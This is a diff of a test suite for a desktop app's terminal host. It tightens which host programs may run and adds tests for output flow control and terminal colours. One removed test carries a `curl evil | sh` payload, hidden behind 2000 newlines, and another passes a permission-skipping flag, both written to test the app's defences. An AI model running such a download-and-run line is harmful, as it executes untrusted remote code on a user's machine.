@@ -29,7 +29,7 @@ const src = path.join(here, "..", "src");
 const shared = await load(path.join(src, "shared", "terminal.ts"));
 const main = await load(path.join(src, "main", "terminals.ts"));
 const state = await load(path.join(src, "renderer", "src", "terminal", "state.ts"));
-const { EndRecord, mayStartAfter } = await load(path.join(src, "renderer", "src", "terminal", "ending.ts"));
+const { TerminalRun } = await load(path.join(src, "renderer", "src", "terminal", "run.ts"));
 const { TerminalEventRouter, HELD_LIMIT_CHARS } = await load(path.join(src, "renderer", "src", "terminal", "router.ts"));
 const theme = await load(path.join(src, "renderer", "src", "terminal", "theme.ts"));
 const pty = require("node-pty");
@@ -62,6 +62,7 @@ test("a malformed spec is refused with the reason", () => {
   refused(spec({ argv: ["bash", 1] }), /string/);
   refused(spec({ argv: ["bash", "a\0b"] }), /NUL/);
   refused(spec({ argv: [""] }), /program/);
+  refused(spec({ argv: ["-a", "x", "rm"] }), /not an option/);
   refused(spec({ argv: Array(300).fill("x") }), /at most/);
   refused(spec({ argv: ["x".repeat(70 * 1024)] }), /too long/);
   refused(spec({ title: " " }), /title/);
@@ -79,18 +80,19 @@ test("sizes are bounded integers", () => {
   assert.equal(shared.isValidSize(5000, 24), false);
 });
 
-test("the toggle maps a host cwd reached through either spelling of a symlinked repos root", () => {
+test("a host path maps into the container through either spelling of a symlinked repos root", () => {
   // ~/repos is a link to /Volumes/dev/repos; git answers the resolved spelling.
   const roots = { ...ROOTS, hostRepos: "/Users/me/repos", hostReposReal: "/Volumes/dev/repos" };
-  const viaReal = spec({ target: "host", cwd: "/Volumes/dev/repos/jkb/crates", argv: ["make"], title: "build" });
-  assert.equal(shared.retarget(viaReal, "container", roots).cwd, "/home/vscode/repos/jkb/crates", "the resolved spelling");
-  assert.equal(shared.retarget({ ...viaReal, cwd: "/Users/me/repos/jkb" }, "container", roots).cwd, "/home/vscode/repos/jkb", "the literal one");
-  assert.equal(shared.retarget({ ...viaReal, cwd: "/Volumes/dev/repos" }, "container", roots).cwd, "/home/vscode/repos", "the root itself");
-  assert.equal(shared.retarget({ ...viaReal, cwd: "/Volumes/dev/repos-old" }, "container", roots).cwd, "/home/vscode/repos", "a sibling falls back");
-  assert.equal(shared.containerPathOf("/Volumes/dev/repos/x", roots), "/home/vscode/repos/x");
+  assert.equal(shared.containerPathOf("/Volumes/dev/repos/jkb/crates", roots), "/home/vscode/repos/jkb/crates", "the resolved spelling");
+  assert.equal(shared.containerPathOf("/Users/me/repos/jkb", roots), "/home/vscode/repos/jkb", "the literal one");
+  assert.equal(shared.containerPathOf("/Volumes/dev/repos", roots), "/home/vscode/repos", "the root itself");
+  assert.equal(shared.containerPathOf("/Volumes/dev/repos-old", roots), undefined, "a sibling is not inside");
   assert.equal(shared.containerPathOf("/Volumes/dev/other", roots), undefined);
   assert.equal(shared.hostPathOf("/Volumes/dev/repos/jkb", roots), "/Users/me/repos/jkb", "re-spelled under hostRepos");
-  assert.equal(shared.retarget(spec({ cwd: "/home/vscode/repos/jkb" }), "host", roots).cwd, "/Users/me/repos/jkb", "back to the literal");
+  assert.equal(shared.hostPathOf("/home/vscode/repos/jkb", roots), "/Users/me/repos/jkb", "from the container");
+  assert.equal(shared.hostPathOf("/tmp", roots), undefined);
+  assert.equal(shared.defaultCwd("container", roots), "/home/vscode/repos");
+  assert.equal(shared.DEFAULT_TARGET, "container");
 });
 
 test("main resolves the repos root's link once, and keeps the spelling", () => {
@@ -103,7 +105,7 @@ test("main resolves the repos root's link once, and keeps the spelling", () => {
   assert.equal(roots.hostRepos, path.join(home, "repos"));
   assert.equal(roots.hostReposReal, fs.realpathSync(real));
   assert.equal(roots.container, "jkb-alt");
-  assert.equal(shared.retarget(spec({ target: "host", cwd: path.join(fs.realpathSync(real), "jkb") }), "container", roots).cwd, "/home/vscode/repos/jkb");
+  assert.equal(shared.containerPathOf(path.join(fs.realpathSync(real), "jkb"), roots), "/home/vscode/repos/jkb");
   const bare = main.machineRoots(path.join(work, "no-such-home"), {});
   assert.equal(bare.hostReposReal, bare.hostRepos, "a root that does not exist yet is only its spelling");
   assert.equal(bare.container, "jkb-dev");
@@ -123,25 +125,6 @@ test("a paste is chunked without splitting a surrogate pair", () => {
   assert.deepEqual(shared.chunkWrite(emoji, 1).join(""), emoji, "a limit below a pair still makes progress");
   const big = "x".repeat(shared.MAX_WRITE_CHARS - 1) + emoji + "y";
   assert.ok(shared.chunkWrite(big).every((c) => c.isWellFormed() && c.length <= shared.MAX_WRITE_CHARS));
-});
-
-test("argv is quoted so a POSIX shell reads the same words", () => {
-  assert.equal(shared.formatArgv(["claude", "--session-id", "abc-1"]), "claude --session-id abc-1");
-  assert.equal(shared.formatArgv(["it's", "a b", "$HOME", ""]), `'it'\\''s' 'a b' '$HOME' ''`);
-  assert.equal(shared.formatArgv(["=ls", "a=b"]), `'=ls' 'a=b'`, "zsh expands a bare word starting with =");
-});
-
-test("the toggle moves a terminal through the repos mount, or to the target's default", () => {
-  const inRepo = spec({ cwd: "/home/vscode/repos/jkb/crates", argv: ["make"], title: "build" });
-  const host = shared.retarget(inRepo, "host", ROOTS);
-  assert.deepEqual(host, { ...inRepo, target: "host", cwd: "/Users/me/repos/jkb/crates" });
-  assert.deepEqual(shared.retarget(host, "container", ROOTS), inRepo, "and back");
-  assert.equal(shared.retarget(spec({ cwd: "/home/vscode/repos" }), "host", ROOTS).cwd, "/Users/me/repos", "the root itself");
-  assert.equal(shared.retarget(spec({ cwd: "/home/vscode/repos-old" }), "host", ROOTS).cwd, "/Users/me", "a sibling is not inside");
-  assert.equal(shared.retarget(spec({ cwd: "/tmp" }), "host", ROOTS).cwd, "/Users/me", "outside the mount");
-  assert.equal(shared.retarget(spec({ target: "host", cwd: "/etc" }), "container", ROOTS).cwd, "/home/vscode/repos");
-  assert.equal(shared.retarget(inRepo, "container", ROOTS), inRepo, "the same target is no change");
-  assert.equal(shared.DEFAULT_TARGET, "container");
 });
 
 // ---- the command each spec runs ------------------------------------------------------------
@@ -200,16 +183,14 @@ test("a container terminal without docker, or with a flag for a container name, 
   assert.match(flag.error, /not a container name/);
 });
 
-test("a host terminal runs its argv in its cwd (a bare name through the login shell), or the login shell, and needs the directory", () => {
-  assert.deepEqual(main.commandFor(spec({ target: "host", cwd: "/w", argv: ["/usr/bin/make", "-j"] }), environment(), TAG), {
+test("a host terminal is the login shell, or an absolute program, and needs the directory", () => {
+  assert.deepEqual(main.commandFor(spec({ target: "host", cwd: "/w", argv: ["/kit/run.sh", "--status"] }), environment(), TAG), {
     ok: true,
-    value: { file: "/usr/bin/make", args: ["-j"], cwd: "/w" },
+    value: { file: "/kit/run.sh", args: ["--status"], cwd: "/w" },
   });
-  assert.deepEqual(main.commandFor(spec({ target: "host", cwd: "/w", argv: ["claude", "--session-id", "it's"] }), environment(), TAG), {
-    ok: true,
-    value: { file: "/bin/zsh", args: ["-l", "-c", `exec claude --session-id 'it'\\''s'`], cwd: "/w" },
-  });
-  assert.equal(main.hostArgv(["claude"], "/opt/homebrew/bin/fish").file, "/bin/sh", "a shell without POSIX quoting is not trusted with the words");
+  const bare = main.commandFor(spec({ target: "host", cwd: "/w", argv: ["claude"] }), environment(), TAG);
+  assert.equal(bare.ok, false, "nothing is looked up on the app's PATH");
+  assert.match(bare.error, /absolute path/);
   assert.deepEqual(main.commandFor(spec({ target: "host", cwd: "/w" }), environment(), TAG).value, { file: "/bin/zsh", args: ["-l"], cwd: "/w" });
   const missing = main.commandFor(spec({ target: "host", cwd: "/gone" }), environment({ isDirectory: () => false }), TAG);
   assert.equal(missing.ok, false);
@@ -240,12 +221,11 @@ function host(over = {}) {
     pty.spawn,
     environment({ isDirectory: (p) => fs.existsSync(p), env: process.env, ...over }),
     emit,
-    async () => true,
   );
-  // Host programs need the person's yes first; these tests give it.
+  // A host program runs only when main issued its spec; these tests issue the ones they run.
   const open = h.open.bind(h);
   h.open = (owner, s, cols, rows) => {
-    if (s?.target === "host" && s.argv?.length > 0) h.approveHost(owner, s);
+    if (s?.target === "host" && s.argv?.length > 0) h.issueHost(owner, s);
     return open(owner, s, cols, rows);
   };
   const until = (pred, what) =>
@@ -460,9 +440,7 @@ test("closing a window sends every container program its end", { skip: !hasSetsi
   assert.match(log(), /<jkb-terminal-end>/);
 });
 
-test("a host program runs only once main's own confirmation said yes, for exactly that argv and cwd", async () => {
-  const asked = [];
-  let answer = false;
+test("the host runs the login shell or a spec main issued, never a renderer's argv", () => {
   const spawned = [];
   const h = new main.TerminalHost(
     (file, args) => {
@@ -471,90 +449,19 @@ test("a host program runs only once main's own confirmation said yes, for exactl
     },
     environment(),
     () => {},
-    async (owner, prompt) => {
-      asked.push({ owner, ...prompt });
-      return answer;
-    },
   );
-  const prog = spec({ target: "host", cwd: "/w", argv: ["claude", "--resume", "it's"], title: "claude" });
-  assert.match(h.open(1, prog, 80, 24).error, /needs your confirmation/, "no renderer call runs it unasked");
-  assert.deepEqual(await h.confirmHost(1, prog), { ok: true, value: false });
-  assert.deepEqual(asked, [{ owner: 1, argv: ["claude", "--resume", "it's"], cwd: "/w", ...main.hostPromptText(prog) }], "the exact argv and cwd");
-  assert.match(asked[0].detail, /Program: claude --resume 'it'\\''s'\nIn: \/w$/);
-  assert.equal(h.open(1, prog, 80, 24).ok, false, "a no is a no");
-  answer = true;
-  assert.deepEqual(await h.confirmHost(1, prog), { ok: true, value: true });
-  assert.equal(h.open(1, prog, 80, 24).ok, true);
-  assert.equal(h.open(1, prog, 80, 24).ok, true, "a restart does not ask again");
-  assert.equal(h.open(2, prog, 80, 24).ok, false, "only for the window that said yes");
-  assert.equal(h.open(1, { ...prog, cwd: "/elsewhere" }, 80, 24).ok, false, "only for that cwd");
-  assert.equal(h.open(1, { ...prog, argv: ["claude", "--dangerously-skip-permissions"] }, 80, 24).ok, false, "only for that argv");
+  const kit = spec({ target: "host", cwd: "/kit", argv: ["/kit/run.sh", "--status"], title: "container: status" });
+  assert.match(h.open(1, kit, 80, 24).error, /login shell or what the app itself built/, "not issued: refused");
+  h.issueHost(1, kit);
+  assert.equal(h.open(1, kit, 80, 24).ok, true, "issued by main: runs");
+  assert.equal(h.open(2, kit, 80, 24).ok, false, "only in the window it was issued to");
+  assert.equal(h.open(1, { ...kit, argv: ["/kit/run.sh", "--remove"] }, 80, 24).ok, false, "only that argv");
+  assert.equal(h.open(1, { ...kit, cwd: "/elsewhere" }, 80, 24).ok, false, "only that cwd");
   assert.equal(h.open(1, spec({ target: "host", cwd: "/w" }), 80, 24).ok, true, "the login shell runs nothing by itself");
-  assert.equal(h.open(1, spec(), 80, 24).ok, true, "a container program is not asked about");
-  assert.equal(asked.length, 2);
-  assert.deepEqual(await h.confirmHost(1, spec()), { ok: true, value: true }, "nothing to ask for a container spec");
-  assert.equal(asked.length, 2);
+  assert.equal(h.open(1, spec({ argv: ["claude"] }), 80, 24).ok, true, "programs run in the container");
   h.closeAll(1);
-  assert.equal(h.open(1, prog, 80, 24).ok, false, "a reload forgets the yes");
-  assert.equal((await h.confirmHost(1, { ...prog, env: {} })).ok, false, "the spec is validated first");
-  const k = spec({ target: "host", cwd: "/kit", argv: ["/kit/run.sh", "--status"] });
-  h.approveHost(1, k);
-  assert.equal(h.open(1, k, 80, 24).ok, true, "a spec main built itself runs without asking");
-});
-
-const SHELLS = ["/bin/sh", "/bin/bash", "/usr/bin/bash", "/bin/zsh", "/usr/bin/zsh"].filter((p, i, all) => {
-  if (!fs.existsSync(p)) return false;
-  const real = fs.realpathSync(p);
-  return all.findIndex((q) => fs.existsSync(q) && fs.realpathSync(q) === real) === i;
-});
-
-for (const shell of SHELLS) {
-  test(`a bare program name on the host is found through the login shell (${shell}), its words intact`, async () => {
-    const bin = path.join(work, "bin");
-    fs.mkdirSync(bin, { recursive: true });
-    fs.writeFileSync(path.join(bin, "jkb-words"), '#!/bin/sh\nfor a in "$@"; do printf "<%s>" "$a"; done; echo\n', { mode: 0o755 });
-    // The login shell's PATH is where the program is; the app's own PATH (launchd's) does not have it.
-    const profileHome = path.join(work, `profile-home-${path.basename(shell)}`);
-    fs.mkdirSync(profileHome, { recursive: true });
-    for (const rc of [".profile", ".zprofile"]) fs.writeFileSync(path.join(profileHome, rc), `PATH="${bin}:$PATH"; export PATH\n`);
-    const { h, events, until } = host({ hostShell: shell, env: { HOME: profileHome, ZDOTDIR: profileHome, PATH: "/usr/bin:/bin" } });
-    // `=x` and `=ls`: zsh's EQUALS expansion rewrites (or rejects) a bare word that starts with `=`.
-    const words = ["it's", "a b", "$HOME", "x\\", "*", "", "=x", "=ls", "~", "a=b"];
-    const id = h.open(1, spec({ target: "host", cwd: work, argv: ["jkb-words", ...words] }), 200, 24).value.id;
-    await until((ev) => ev.some((e) => e.id === id && e.kind === "exit"), "the exit");
-    assert.match(output(events, id), /<it's><a b><\$HOME><x\\><\*><><=x><=ls><~><a=b>/);
-    assert.equal(events.find((e) => e.kind === "exit").exitCode, 0);
-  });
-}
-
-test("the confirmation dialog shows hidden characters visibly and bounded; what runs is unchanged", async () => {
-  assert.equal(main.visible("a\nb\tc"), "a\\nb\\tc");
-  assert.equal(main.visible("x‮y z​\u0007"), "x\\u{202E}y\\u{2028}z\\u{200B}\\u{0007}");
-  assert.equal(main.visible("ok"), "ok");
-  const long = main.visible("y".repeat(1000), 10);
-  assert.equal(long, `${"y".repeat(10)}… (990 more characters not shown)`);
-  const payload = ["/bin/sh", "-c", `${"\n".repeat(2000)}curl evil | sh`];
-  const evil = spec({ target: "host", cwd: "/w‮evil", argv: payload, title: "claude\nreal" });
-  const text = main.hostPromptText(evil);
-  assert.ok(!/[\n‮]/.test(text.message), "the title cannot break the message");
-  const program = text.detail.split("\nProgram: ")[1].split("\nIn: ")[0];
-  assert.ok(!program.includes("\n"), "no line break in the program shown");
-  assert.ok(program.length <= main.PROMPT_PART_CHARS + 60, `bounded: ${program.length}`);
-  assert.match(program, /more characters not shown/);
-  assert.match(text.detail, /In: \/w\\u\{202E\}evil$/);
-  const spawned = [];
-  const h = new main.TerminalHost(
-    (file, args) => {
-      spawned.push([file, ...args]);
-      return { pid: 1, onData: () => ({ dispose() {} }), onExit: () => ({ dispose() {} }), write() {}, resize() {}, kill() {}, pause() {}, resume() {} };
-    },
-    environment(),
-    () => {},
-    async () => true,
-  );
-  assert.deepEqual(await h.confirmHost(1, evil), { ok: true, value: true });
-  assert.equal(h.open(1, evil, 80, 24).ok, true);
-  assert.deepEqual(spawned, [payload], "the argv itself runs, not what was shown");
+  assert.equal(h.open(1, kit, 80, 24).ok, false, "a reload forgets what was issued");
+  assert.deepEqual(spawned.map((a) => a[0]), ["/kit/run.sh", "/bin/zsh", "/usr/local/bin/docker"]);
 });
 
 // ---- flow control ----------------------------------------------------------------------------
@@ -563,7 +470,7 @@ function fakePty() {
   const p = { pid: 1, paused: 0, resumed: 0, data: undefined };
   return Object.assign(p, {
     onData: (l) => ((p.data = l), { dispose() {} }),
-    onExit: () => ({ dispose() {} }),
+    onExit: (l) => ((p.exit = l), { dispose() {} }),
     write() {},
     resize() {},
     kill() {},
@@ -571,6 +478,16 @@ function fakePty() {
     resume: () => p.resumed++,
   });
 }
+
+test("the last output at an exit never pauses the PTY again", () => {
+  const p = fakePty();
+  const h = new main.TerminalHost(() => p, environment(), () => {});
+  const id = h.open(1, spec(), 80, 24).value.id;
+  p.data("x".repeat(shared.FLOW.high + 1)); // gathered, not yet sent (below FLUSH_BYTES)
+  p.exit({ exitCode: 0 });
+  assert.equal(p.paused, 0, "no pause, and no exit check left polling for a process that is gone");
+  assert.equal(h.isPaused(id), false);
+});
 
 test("main stops reading a PTY past the high watermark and resumes below the low one", () => {
   const p = fakePty();
@@ -610,6 +527,32 @@ test("a program that exits while paused still delivers all its output, and a lat
   assert.equal(text.replace(/[^y]/g, "").length, tail, "the tail was read before node-pty's destroy timer");
   assert.equal(h.ack(1, id, text.length), false, "an ack after the exit is for nothing, and is refused");
   assert.equal(h.isPaused(id), false);
+});
+
+test("ending a paused terminal reads it through, so a program that writes as it hangs up can exit", async () => {
+  const { h, events, until } = host();
+  // Past the watermark first (main pauses, nobody acknowledges: the renderer asked for the end),
+  // then a hangup handler that writes 300 KB before it exits cleanly, as `make` says "*** Hangup".
+  const script = `trap 'head -c 300000 /dev/zero | tr "\\0" z; exit 0' HUP; head -c ${shared.FLOW.high + 50_000} /dev/zero | tr '\\0' x; while :; do sleep 0.05; done`;
+  const id = h.open(1, spec({ target: "host", cwd: work, argv: ["/bin/sh", "-c", script] }), 80, 24).value.id;
+  await poll(() => h.isPaused(id), "the pause");
+  const ended = await h.close(1, id);
+  assert.deepEqual(ended, { ok: true, value: { target: "host", confirmed: true, detail: "the program ended" } });
+  await until((ev) => ev.some((e) => e.id === id && e.kind === "exit"), "the exit");
+  const exit = events.find((e) => e.id === id && e.kind === "exit");
+  assert.equal(exit.exitCode, 0, "its own clean exit, not TERM or KILL");
+  assert.equal(exit.signal, undefined);
+  // Read through rather than held at the watermark. Not to the last byte: node-pty can drop the tail
+  // of a fast program's output at its exit (the "gathered" flake in D53.10).
+  assert.ok(output(events, id).replace(/[^z]/g, "").length > 250_000, "the handler's output was read");
+});
+
+test("a host program that ignores the hangup is sent TERM, then KILL, and its end confirmed", async () => {
+  const { h, events, until } = host();
+  const id = h.open(1, spec({ target: "host", cwd: work, argv: ["/bin/sh", "-c", "trap '' HUP TERM; echo UP; while :; do sleep 0.05; done"] }), 80, 24).value.id;
+  await until((ev) => output(ev, id).includes("UP"), "the program");
+  const ended = await h.close(1, id);
+  assert.deepEqual(ended, { ok: true, value: { target: "host", confirmed: true, detail: "the program ended (killed)" } });
 });
 
 test("a fast producer is held near the high watermark until its output is acknowledged", async () => {
@@ -765,62 +708,114 @@ test("a closed terminal's late output and exit are dropped, not held", () => {
   assert.deepEqual(got, []);
 });
 
-test("a later start waits for every end sent before it, and an unconfirmed one stops it until overridden", async () => {
-  const ends = new EndRecord();
-  let finish;
-  // Gen 1 (a toggle) sends its end; it is slow.
-  const own = ends.record(new Promise((resolve) => (finish = resolve)));
-  // Gen 2 (a quick toggle back) sent nothing of its own, but must wait for gen 1's.
-  let seen = "pending";
-  const gen2 = ends.settled().then((e) => (seen = e));
-  await new Promise((r) => setTimeout(r, 20));
-  assert.equal(seen, "pending", "it waits");
-  const unconfirmed = { target: "container", confirmed: false, detail: "may still be running" };
-  finish(unconfirmed);
-  assert.deepEqual(await own, unconfirmed);
-  await gen2;
-  assert.deepEqual(seen, unconfirmed);
-  assert.equal(mayStartAfter(seen, false), false, "a toggle or a Resume does not start beside it");
-  assert.equal(mayStartAfter(seen, true), true, "Restart does");
-  // A later confirmed end does not hide the earlier unconfirmed one.
-  ends.record(Promise.resolve({ target: "host", confirmed: true, detail: "ended" }));
-  assert.equal((await ends.settled()).confirmed, false);
-  ends.clear();
-  assert.equal(await ends.settled(), undefined);
-  ends.record(Promise.reject(new Error("bridge gone")));
-  assert.match((await ends.settled()).detail, /bridge gone/);
-  assert.equal(mayStartAfter(undefined, false), true);
+// ---- one terminal's starts and ends, with a fake bridge ----------------------------------------
+
+function fakeRun({ end = { target: "container", confirmed: true, detail: "ended" } } = {}) {
+  const calls = [];
+  const opens = [];
+  let nextId = 1;
+  const bridge = {
+    open: (s) =>
+      new Promise((resolve) => {
+        const id = nextId++;
+        calls.push(["open", id, s.argv.join(" ")]);
+        opens.push(() => resolve({ ok: true, value: { id, spec: s } }));
+      }),
+    close: async (id) => {
+      calls.push(["close", id]);
+      return { ok: true, value: typeof end === "function" ? end(id) : end };
+    },
+  };
+  const statuses = [];
+  const notes = [];
+  const screen = {
+    size: () => ({ cols: 80, rows: 24 }),
+    note: (t) => notes.push(t),
+    status: (st) => statuses.push(st),
+    attach: (id) => calls.push(["attach", id]),
+    detach: (id) => calls.push(["detach", id]),
+  };
+  const run = new TerminalRun(bridge, screen);
+  const settle = () => new Promise((r) => setTimeout(r, 0));
+  return { run, calls, opens, statuses, notes, settle, landOpen: async (i) => (opens[i](), settle()) };
+}
+
+test("a PTY whose open lands after its tab was closed is ended, and the close waits for it", async () => {
+  const { run, calls, landOpen, settle } = fakeRun();
+  void run.start(spec({ argv: ["claude", "--resume", "u"] }));
+  await settle();
+  let closed;
+  void run.dispose().then((e) => (closed = e));
+  await settle();
+  assert.equal(closed, undefined, "the close waits for the open in flight");
+  await landOpen(0);
+  await settle();
+  assert.deepEqual(calls, [["open", 1, "claude --resume u"], ["detach", 1], ["close", 1]], "it is ended, never shown");
+  assert.equal(closed.confirmed, true);
 });
 
-test("a terminal whose end is unconfirmed is shown, not relaunched; a closed one is kept as an orphan", () => {
+test("a restart during an open in flight ends the first PTY before opening the second", async () => {
+  const { run, calls, landOpen, settle } = fakeRun();
+  void run.start(spec({ argv: ["a"] }));
+  await settle();
+  void run.start(spec({ argv: ["b"] }), { override: true });
+  await settle();
+  assert.deepEqual(calls, [["open", 1, "a"]], "nothing else opens while the first is in flight");
+  await landOpen(0);
+  await settle();
+  assert.deepEqual(calls.slice(1), [["detach", 1], ["close", 1], ["open", 2, "b"]]);
+  await landOpen(1);
+  assert.deepEqual(calls.at(-1), ["attach", 2]);
+});
+
+test("after an unconfirmed end nothing starts until Restart overrides it", async () => {
+  const unconfirmed = { target: "container", confirmed: false, detail: "exit 4: still running" };
+  const { run, calls, landOpen, statuses, settle } = fakeRun({ end: unconfirmed });
+  void run.start(spec({ argv: ["claude", "--resume", "u"] }));
+  await settle();
+  await landOpen(0);
+  // The tab's close: the end comes back unconfirmed.
+  assert.deepEqual(await run.stop(), unconfirmed);
+  // A Resume (planOpen relaunch) or a re-attach starts it again: refused.
+  await run.start(spec({ argv: ["claude", "--resume", "u"] }));
+  assert.deepEqual(statuses.at(-1), { kind: "failed", error: statuses.at(-1).error, mayBeRunning: true });
+  assert.match(statuses.at(-1).error, /may still be running \(exit 4: still running\)/);
+  assert.equal(calls.filter((c) => c[0] === "open").length, 1, "no second program");
+  // Asked again, the answer is the same: the unconfirmed end is remembered.
+  await run.start(spec({ argv: ["claude", "--resume", "u"] }));
+  assert.equal(calls.filter((c) => c[0] === "open").length, 1);
+  // Restart is the person's override.
+  const restarting = run.start(spec({ argv: ["claude", "--resume", "u"] }), { override: true });
+  await settle();
+  await landOpen(1);
+  await restarting;
+  assert.equal(calls.filter((c) => c[0] === "open").length, 2);
+  assert.deepEqual(statuses.at(-1), { kind: "running" });
+});
+
+test("a start after the program exited by itself opens without ending anything", async () => {
+  const { run, calls, landOpen, settle } = fakeRun();
+  void run.start(spec({ argv: ["a"] }));
+  await settle();
+  await landOpen(0);
+  run.exited(1);
+  void run.start(spec({ argv: ["b"] }));
+  await settle();
+  assert.deepEqual(calls.map((c) => c[0]), ["open", "attach", "open"]);
+});
+
+test("a tab being closed, or whose end was unconfirmed, is shown rather than started beside", () => {
   const uuid = "0f8fad5b-d9cb-469f-a165-70867728950e";
   const resume = spec({ argv: ["claude", "--resume", uuid], title: "Resume", sessionUuid: uuid });
   let s = S.reduce(S.INITIAL_STATE, { type: "open", key: 1, spec: resume, placement: "drawer" });
+  s = S.reduce(s, { type: "status", key: 1, status: { kind: "closing" } });
+  assert.equal(S.planOpen(s, resume).kind, "show", "its end is on its way");
+  assert.equal(S.statusLabel(s.entries[0].status), "ending");
   s = S.reduce(s, { type: "status", key: 1, status: { kind: "failed", error: "x", mayBeRunning: true } });
   assert.equal(S.planOpen(s, resume).kind, "show", "an unconfirmed end is possibly live");
   assert.equal(S.statusLabel(s.entries[0].status), "may still run");
-  // Closed with x while it may run: the tab goes, the orphan stays.
-  s = S.reduce(s, { type: "close", key: 1 });
-  assert.deepEqual(s.entries, []);
-  assert.deepEqual(s.orphans, [{ key: 1, spec: resume }]);
-  assert.equal(S.planOpen(s, resume).kind, "afterOrphan", "a Resume waits for it rather than starting new");
-  s = S.reduce(s, { type: "orphanEnded", key: 1, confirmed: false, detail: "exit 4" });
-  assert.deepEqual(s.orphans, [{ key: 1, spec: resume, detail: "exit 4" }]);
-  assert.equal(s.drawerOpen, true, "an unconfirmed end opens the drawer, where it is shown");
-  assert.equal(S.planOpen(s, resume).orphan.key, 1);
-  s = S.reduce(s, { type: "dropOrphan", key: 1 });
-  assert.equal(S.planOpen(s, resume).kind, "new");
-  // A running tab closed and confirmed ended leaves nothing behind.
-  s = S.reduce(s, { type: "open", key: 2, spec: resume, placement: "drawer" });
-  s = S.reduce(s, { type: "close", key: 2 });
-  assert.equal(s.orphans.length, 1);
-  s = S.reduce(s, { type: "orphanEnded", key: 2, confirmed: true, detail: "ended" });
-  assert.deepEqual(s.orphans, []);
-  // An exited tab has nothing to end.
-  s = S.reduce(s, { type: "open", key: 3, spec: resume, placement: "drawer" });
-  s = S.reduce(s, { type: "status", key: 3, status: { kind: "exited", exitCode: 0 } });
-  s = S.reduce(s, { type: "close", key: 3 });
-  assert.deepEqual(s.orphans, []);
+  s = S.reduce(s, { type: "status", key: 1, status: { kind: "failed", error: "x" } });
+  assert.equal(S.planOpen(s, resume).kind, "relaunch", "an ordinary failure is started again");
 });
 
 test("held output dropped unseen is reported, so main can count it as drawn", () => {
@@ -871,15 +866,22 @@ function contrast(a, b) {
   return (x + 0.05) / (y + 0.05);
 }
 
-test("the terminal has all 16 ANSI colours as light and dark tokens, each readable on its ground", () => {
+test("the terminal has all 16 ANSI colours as light and dark tokens, readable as text and as backgrounds", () => {
   const { light, dark } = schemes();
   const darkOnly = tokensCss.slice(tokensCss.indexOf("@media (prefers-color-scheme: dark)"));
+  const backgrounds = new Set(theme.BACKGROUND_ANSI);
   for (const [key, token] of Object.entries(theme.ANSI_TOKENS)) {
     assert.match(light[token] ?? "", /^#[0-9a-f]{6}$/i, `${token} has a light value`);
     assert.ok(darkOnly.includes(`${token}:`), `${token} has a dark value`);
-    assert.ok(contrast(light[token], light["--terminal-bg"]) >= 3, `${key} ${light[token]} on the light ground`);
+    if (backgrounds.has(key)) {
+      // Behind black text (ESC[30;107m, a status bar); as text, minimumContrastRatio darkens it.
+      assert.ok(contrast(light["--terminal-ansi-black"], light[token]) >= 3, `black on ${key} ${light[token]}, light`);
+    } else {
+      assert.ok(contrast(light[token], light["--terminal-bg"]) >= 3, `${key} ${light[token]} on the light ground`);
+    }
     if (key !== "black") assert.ok(contrast(dark[token], dark["--terminal-bg"]) >= 3, `${key} ${dark[token]} on the dark ground`);
   }
+  assert.ok(theme.MIN_CONTRAST_RATIO >= 3, "a light colour drawn as text is fixed up");
   assert.equal(Object.keys(theme.ANSI_TOKENS).length, 16);
 });
 
